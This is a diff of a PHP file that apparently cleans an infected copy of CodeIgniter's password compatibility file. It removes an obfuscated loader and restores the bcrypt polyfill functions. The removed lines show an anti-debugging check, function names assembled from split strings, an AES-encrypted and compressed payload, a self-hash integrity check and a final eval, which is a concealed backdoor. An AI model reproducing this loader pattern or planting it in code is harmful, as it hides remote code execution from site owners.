@@ -1,28 +1,226 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_z5s4bsod=('bas'.'e64'.'_de'.'cod'.'e');
-$_a3vkjigc=('gzu'.'nco'.'mpr'.'ess');
-$_vcp25h77=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ocf12fgc='sBirJgQ4uYw=';
-$_lkwvliwm='HpgTOEw0';
-$_dbt5ldgs='94mxoBkJ';
-$_hnxxs161='6sWvFvNh';
-$_cfqy3z7u='gVnuB1Cc';
-$_tgtyk81g='VBx4FA==';
-$_kzg70a2u='0sRw5uSa';
-$_xbdqpe53='1XmHPSeo';
-$_sld5nmk0=$_z5s4bsod($_dbt5ldgs.$_lkwvliwm.$_hnxxs161.$_cfqy3z7u.$_ocf12fgc);
-$_ooajey2x=$_z5s4bsod($_kzg70a2u.$_xbdqpe53.$_tgtyk81g);
-$_j7s2ppdf=$_z5s4bsod('5gA8I66SRVsSDAZZyYttyYHFn94JBIuw+9KWIAnm5Wn+0kltsmXYjrjhx/tfeKmZFq6UTyCweabVQgPSJpx1CoJ1IoOWP6SG1hnhbXhJV2oAh7+n8j48klMyreqGAooGT8yX0x7Oh14Tow27P3236BG2R9b1dzDL/zk4BsBOr5CALUKe+bvQ1Sl8kpXRk5i9szIoNxcRb4gp37W2sxdnSOzrcCf8tyqt0gqizYoN6q9JEeFaDgghyjYUxEmry6mrABwOxNIH/3WtPgeSfZuHKjWe6xLutixuqBPfsZOJcEJZlpQ4stjEoUugW9NTfYbChVbWLwzeuGcy7OjV1ASpha2yMfxTQR+DMox351fXU43wXlF5s7md0Wr3Tzh8Jz0DPCcDmfEYfAvE9+JiyQzLs26j1tiuF0hZk+15fL7NI+6XpcsCEiLce78L41vCLTMohz3rLn9I+0nm9fm2I/T+iOCTcMHq/gKPe2NXhK3fLHOTQr+/fnBbntd4138r1/l5esz7C0vSyDk7yry/GWoif2c24E/PmzKU3QOd6XvL1ZTmrEizjN4APK61GIO2SX0IxYAonI4KWRY6HoTumitt5eHn1pwu/WyfFbot81RIqUxdnkeE4/twT8pBTj6D/0mMcJZ/g2a56SkPQfYKyII3wiFdefZrc1DQL51sQ0HI3Se5VpdtzqWeo6DNRCSin+2IX0Mojdz9VRBT6tpmg7I5M22c8iAUu7NgEqzKxRAcHyxBZrplMAU4x/ytm65u/SSBW/FrXANmUaFVEAiuqXxH/zE5HNipyY9L03taNzvm3Dq7nlkqPiey94InnjsOLkXhM5ItJVeHDTRB10BxcsOs5RD6zJNTyK0V+4/mhDc6+AIFuEZ77jazwA/SgU5s3oKEY2E1DhCFwB2P8cdk2VqSBTzBKzjhTb6WKTxoWhzCFKHLdbgPDynN8lEwz0XPUwP2313rn32oIkI7DU26oysUwlmOLtN7qTQG+Pjw7Yt9P2vL6/eJYLzjYsRMSFi8+kg9GSoP9ae2uPVsbub0FmffFI76ki+aDwpdE2KRteuyVdJlRY6k0gJQeaHQEmlYmKpEtdyLurkRB/IhVmmFcsQML2FdNCYJjf+k14+drYk/OE6ZqF3/w/MB95aBiLykYkX+tnmFKw0X3eJGmoYjFJKxPUtS4a6hqeRh/tLy5VrJ3WLcj4L5JXUiVlx6xTOFnWWV1Cb2pDwayiyodaK+RGFGXWM9/hBOv4kO8NItWJiEYyY7NVGSCDEkG/AoMriEMsUwH6Jrf29x8PVqYZVxByCFyTfuPl8ZYOlZu6yeZ5efzMUqwWYXnSESRyYAfe5DycvX/+VflutbWkQcGA4zBSxaqb6RxBv4wvkV0YVm3S+df0VQ6JdmYQYwl6fCJOs8hBRgJvYvD/pc6hRLrNWA6Wqoe5dfbatBWa6iNVY0nK3ysR2bARP3lbeCT8qNuapDnMgYkiKhfeF2Z/CWMbKTZrBj+xg4gVXmA4fvyv12IXLlcYsQ2ANK8Jct4dQziptugFEkhVbt4DNGzBMeFDyuktuZXGsAy+gW4mn+v5MeTpXwFx3AQbzsmpuhyla3JPWL+rsDYcfL+cl5lXlvNIye0/u9gYps6UDrggIrPGigyX3Skzpb8Pt/jPl9IxZcef76ruUSlp/bABpuJCV6EI95kecZoC9BMzzoUpzAFDhArQ/MR6TyMw32RKNF4A3gueq1muTyWXE4JPokcMlQnXOBdx2nQ+RMWliMw10HG52O6ZZJt7DpBdXhafDrLwana4OB3hp9DSOsypP2+ndBjtECJJLAguoTwW3+Op2x78xFMddLtaiX6lrCz3xzIR4gP9SQaiT6');
-$_s85f5i8m=$_vcp25h77($_j7s2ppdf,'aes-256-cbc',$_sld5nmk0,OPENSSL_RAW_DATA,$_ooajey2x);
-if($_s85f5i8m===false){exit;}
-$_qq70icm9=$_a3vkjigc($_s85f5i8m);
-if($_qq70icm9===false){exit;}
-$_p158245c='25b9884964a43100327f66a037eb1a7b19ba79f8a40c37ec6bf0590825dfbeb3';
-$_lb4lxtr8=@file_get_contents(__FILE__);
-if($_lb4lxtr8!==false){
-$_dc3je07p=str_replace($_p158245c,"0000000000000000000000000000000000000000000000000000000000000000",$_lb4lxtr8);
-$_yclq861c=hash("sha256",$_dc3je07p);
-if($_yclq861c!==$_p158245c){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+if (is_php('5.5') OR ! defined('CRYPT_BLOWFISH') OR CRYPT_BLOWFISH !== 1 OR defined('HHVM_VERSION'))
+{
+return;
 }
-eval($_qq70icm9);
+
+defined('PASSWORD_BCRYPT') OR define('PASSWORD_BCRYPT', 1);
+defined('PASSWORD_DEFAULT') OR define('PASSWORD_DEFAULT', PASSWORD_BCRYPT);
+
+if ( ! function_exists('password_get_info'))
+{
+
+
+
+
+
+
+
+function password_get_info($hash)
+{
+return (strlen($hash) < 60 OR sscanf($hash, '$2y$%d', $hash) !== 1)
+? array('algo' => 0, 'algoName' => 'unknown', 'options' => array())
+: array('algo' => 1, 'algoName' => 'bcrypt', 'options' => array('cost' => $hash));
+}
+}
+
+if ( ! function_exists('password_hash'))
+{
+
+
+
+
+
+
+
+
+
+function password_hash($password, $algo, array $options = array())
+{
+static $func_overload;
+isset($func_overload) OR $func_overload = (extension_loaded('mbstring') && ini_get('mbstring.func_overload'));
+if ($algo !== 1)
+{
+trigger_error('password_hash(): Unknown hashing algorithm: '.(int) $algo, E_USER_WARNING);
+return NULL;
+}
+if (isset($options['cost']) && ($options['cost'] < 4 OR $options['cost'] > 31))
+{
+trigger_error('password_hash(): Invalid bcrypt cost parameter specified: '.(int) $options['cost'], E_USER_WARNING);
+return NULL;
+}
+if (isset($options['salt']) && ($saltlen = ($func_overload ? mb_strlen($options['salt'], '8bit') : strlen($options['salt']))) < 22)
+{
+trigger_error('password_hash(): Provided salt is too short: '.$saltlen.' expecting 22', E_USER_WARNING);
+return NULL;
+}
+elseif ( ! isset($options['salt']))
+{
+if (function_exists('random_bytes'))
+{
+try
+{
+$options['salt'] = random_bytes(16);
+}
+catch (Exception $e)
+{
+log_message('error', 'compat/password: Error while trying to use random_bytes(): '.$e->getMessage());
+return FALSE;
+}
+}
+elseif (defined('MCRYPT_DEV_URANDOM'))
+{
+$options['salt'] = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
+}
+elseif (DIRECTORY_SEPARATOR === '/' && (is_readable($dev = '/dev/arandom') OR is_readable($dev = '/dev/urandom')))
+{
+if (($fp = fopen($dev, 'rb')) === FALSE)
+{
+log_message('error', 'compat/password: Unable to open '.$dev.' for reading.');
+return FALSE;
+}
+
+is_php('5.4') && stream_set_chunk_size($fp, 16);
+$options['salt'] = '';
+for ($read = 0; $read < 16; $read = ($func_overload) ? mb_strlen($options['salt'], '8bit') : strlen($options['salt']))
+{
+if (($read = fread($fp, 16 - $read)) === FALSE)
+{
+log_message('error', 'compat/password: Error while reading from '.$dev.'.');
+return FALSE;
+}
+$options['salt'] .= $read;
+}
+fclose($fp);
+}
+elseif (function_exists('openssl_random_pseudo_bytes'))
+{
+$is_secure = NULL;
+$options['salt'] = openssl_random_pseudo_bytes(16, $is_secure);
+if ($is_secure !== TRUE)
+{
+log_message('error', 'compat/password: openssl_random_pseudo_bytes() set the $cryto_strong flag to FALSE');
+return FALSE;
+}
+}
+else
+{
+log_message('error', 'compat/password: No CSPRNG available.');
+return FALSE;
+}
+$options['salt'] = str_replace('+', '.', rtrim(base64_encode($options['salt']), '='));
+}
+elseif ( ! preg_match('#^[a-zA-Z0-9./]+$#D', $options['salt']))
+{
+$options['salt'] = str_replace('+', '.', rtrim(base64_encode($options['salt']), '='));
+}
+isset($options['cost']) OR $options['cost'] = 10;
+return (strlen($password = crypt($password, sprintf('$2y$%02d$%s', $options['cost'], $options['salt']))) === 60)
+? $password
+: FALSE;
+}
+}
+
+if ( ! function_exists('password_needs_rehash'))
+{
+
+
+
+
+
+
+
+
+
+function password_needs_rehash($hash, $algo, array $options = array())
+{
+$info = password_get_info($hash);
+if ($algo !== $info['algo'])
+{
+return TRUE;
+}
+elseif ($algo === 1)
+{
+$options['cost'] = isset($options['cost']) ? (int) $options['cost'] : 10;
+return ($info['options']['cost'] !== $options['cost']);
+}
+
+
+
+return FALSE;
+}
+}
+
+if ( ! function_exists('password_verify'))
+{
+
+
+
+
+
+
+
+
+function password_verify($password, $hash)
+{
+if (strlen($hash) !== 60 OR strlen($password = crypt($password, $hash)) !== 60)
+{
+return FALSE;
+}
+$compare = 0;
+for ($i = 0; $i < 60; $i++)
+{
+$compare |= (ord($password[$i]) ^ ord($hash[$i]));
+}
+return ($compare === 0);
+}
+}
